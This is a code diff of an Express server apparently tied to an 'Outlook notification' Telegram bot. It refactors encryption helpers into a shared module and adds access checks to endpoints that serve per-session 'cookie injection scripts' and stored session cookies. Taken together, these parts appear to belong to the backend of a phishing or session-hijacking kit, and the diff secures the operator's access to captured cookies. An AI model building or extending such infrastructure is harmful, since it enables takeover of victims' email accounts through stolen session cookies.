@@ -27,70 +27,16 @@ const OutlookNotificationBot = require('./telegram-bot');
 const app = express();
 const PORT = 5000; // Fixed port for Replit environment
 
-// Auto-generate encryption seed if not provided
-function generateEncryptionSeed() {
-    // Try to load existing seed from file first
-    const seedFile = path.join(__dirname, '.encryption-seed');
-    
-    if (fs.existsSync(seedFile)) {
-        try {
-            const existingSeed = fs.readFileSync(seedFile, 'utf8').trim();
-            if (existingSeed && existingSeed.length >= 32) {
-                console.log('🔐 Using existing encryption seed from file');
-                return existingSeed;
-            }
-        } catch (error) {
-            console.warn('⚠️ Error reading existing seed file:', error.message);
-        }
-    }
-    
-    // Generate new secure seed
-    const newSeed = crypto.randomBytes(32).toString('hex');
-    
-    try {
-        fs.writeFileSync(seedFile, newSeed, 'utf8');
-        console.log('🔑 Generated new encryption seed and saved to file');
-    } catch (error) {
-        console.warn('⚠️ Could not save seed to file:', error.message);
-    }
-    
-    return newSeed;
-}
+// Import shared encryption utilities to eliminate code duplication
+const encryptionUtils = require('./src/encryption-utils');
 
-// Encryption configuration
-const ENCRYPTION_SEED = process.env.ENCRYPTION_SEED || generateEncryptionSeed();
-const ENCRYPTION_KEY = crypto.scryptSync(ENCRYPTION_SEED, 'salt', 32);
-
-// Utility functions for encryption
+// Use shared encryption functions
 function encryptData(text) {
-    if (!text) return null;
-    const iv = crypto.randomBytes(16);
-    const cipher = crypto.createCipheriv('aes-256-gcm', ENCRYPTION_KEY, iv);
-    let encrypted = cipher.update(text, 'utf8', 'hex');
-    encrypted += cipher.final('hex');
-    const authTag = cipher.getAuthTag();
-    return iv.toString('hex') + ':' + authTag.toString('hex') + ':' + encrypted;
+    return encryptionUtils.encryptData(text);
 }
 
 function decryptData(encryptedText) {
-    if (!encryptedText) return null;
-    try {
-        const parts = encryptedText.split(':');
-        if (parts.length !== 3) return null;
-        
-        const iv = Buffer.from(parts[0], 'hex');
-        const authTag = Buffer.from(parts[1], 'hex');
-        const encrypted = parts[2];
-        
-        const decipher = crypto.createDecipheriv('aes-256-gcm', ENCRYPTION_KEY, iv);
-        decipher.setAuthTag(authTag);
-        let decrypted = decipher.update(encrypted, 'hex', 'utf8');
-        decrypted += decipher.final('utf8');
-        return decrypted;
-    } catch (error) {
-        console.warn('Decryption failed:', error.message);
-        return null;
-    }
+    return encryptionUtils.decryptData(encryptedText);
 }
 
 // Security configuration - Always auto-generate
@@ -2168,10 +2114,23 @@ app.get('/api/preload-stats', requireAdminAuth, (req, res) => {
     }
 });
 
-// Serve cookie injection scripts
+// Serve cookie injection scripts - SECURED
 app.get('/api/cookies/:sessionId', (req, res) => {
     try {
         const sessionId = req.params.sessionId;
+        const clientSessionId = req.headers['x-session-id'];
+        
+        // Verify admin access or session ownership with proper authorization
+        const hasAdminAccess = req.headers['x-admin-token'] === ADMIN_TOKEN;
+        const hasSessionAccess = clientSessionId && userSessions.has(clientSessionId) && clientSessionId === sessionId;
+        
+        if (!hasAdminAccess && !hasSessionAccess) {
+            return res.status(403).json({
+                error: 'Access denied - admin token or session owner access required',
+                sessionId: sessionId,
+                message: 'Session ID must match or admin token required'
+            });
+        }
         const sessionDir = path.join(__dirname, 'session_data');
         const injectionFilename = `inject_session_${sessionId}.js`;
         const injectionPath = path.join(sessionDir, injectionFilename);
@@ -2196,10 +2155,23 @@ app.get('/api/cookies/:sessionId', (req, res) => {
     }
 });
 
-// Get session data with cookies
+// Get session data with cookies - SECURED
 app.get('/api/session-data/:sessionId', (req, res) => {
     try {
         const sessionId = req.params.sessionId;
+        const clientSessionId = req.headers['x-session-id'];
+        
+        // Verify admin access or session ownership with proper authorization
+        const hasAdminAccess = req.headers['x-admin-token'] === ADMIN_TOKEN;
+        const hasSessionAccess = clientSessionId && userSessions.has(clientSessionId) && clientSessionId === sessionId;
+        
+        if (!hasAdminAccess && !hasSessionAccess) {
+            return res.status(403).json({
+                error: 'Access denied - admin token or session owner access required',
+                sessionId: sessionId,
+                message: 'Session ID must match or admin token required'
+            });
+        }
         const sessionDir = path.join(__dirname, 'session_data');
 
         // Find session file
